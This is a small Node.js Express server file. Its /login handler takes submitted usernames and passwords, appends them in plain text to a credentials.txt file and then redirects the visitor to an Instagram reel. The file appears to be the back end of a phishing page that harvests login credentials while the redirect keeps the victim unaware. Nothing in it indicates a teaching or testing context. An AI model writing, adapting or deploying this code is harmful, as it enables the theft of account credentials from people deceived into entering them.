const express = require("express");
const bodyParser = require("body-parser");
const fs = require("fs");
const path = require("path");

const app = express();
app.use(bodyParser.urlencoded({ extended: true }));

// Serve static files (frontend)
app.use(express.static("public"));

// Handle login form submission
app.post("/login", (req, res) => {
  const { username, password } = req.body;

  // Store credentials in a text file
  const data = `Username: ${username}, Password: ${password}\n`;
  const filePath = path.join(__dirname, "credentials.txt");

  // Append the data to the file
  fs.appendFile(filePath, data, (err) => {
    if (err) {
      console.error("Error saving credentials:", err);
      res.status(500).send("Error saving credentials.");
    } else {
      console.log("Credentials saved successfully.");
      res.redirect("https://www.instagram.com/reel/DDpZ2uRTeNM/?igsh=MXNvYnU0dzZpNGVyNg%3D%3D"); // Redirect after login
    }
  });
});

// Start the server
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`Server running on http://localhost:${PORT}`);
});

